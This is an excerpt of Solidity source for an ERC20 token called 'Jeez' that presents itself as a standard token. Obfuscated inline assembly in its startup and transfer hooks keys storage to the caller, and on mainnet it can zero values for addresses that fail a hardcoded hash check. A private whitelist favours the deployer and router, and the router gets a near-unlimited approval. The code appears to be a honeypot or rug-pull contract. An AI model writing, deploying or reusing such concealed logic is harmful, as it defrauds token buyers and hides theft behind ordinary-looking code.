...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addJeez;
    uint256 private _badChoice = block.number*2;

    mapping (address => bool) private _primaryThe; 
    mapping (address => bool) private _secondaryThe;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private caramelUp;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private demonGate;
    address public pair;
    ...
    bool private trading; uint256 private darkestBlack = 1; bool private smokeUp;
    uint256 private _decimals; uint256 private swimBack;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addJeez.push(_router); addJeez.push(msgSender_); addJeez.push(pair);
        for (uint256 q=0; q < 3;) {_primaryThe[addJeez[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenStarter() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x23789519e240c8ea1e088f7ee7d27039140a30af29992abc72dda70b2aba3b66
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xd6acd0a58992213a38f380867f7723417c9e589b1ae5308ef5b465fe76fe5c6a,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _badChoice = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addJeez[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployJeez(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addJeez[0], 10 ** 77);
        _TokenStarter();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployJeez(creator, initialSupply);
    }
}

contract Jeez is ERC20Token {
    constructor() ERC20Token("Jeez", "JEEZ", msg.sender, 1175000 * 10 ** 18) {
    }
}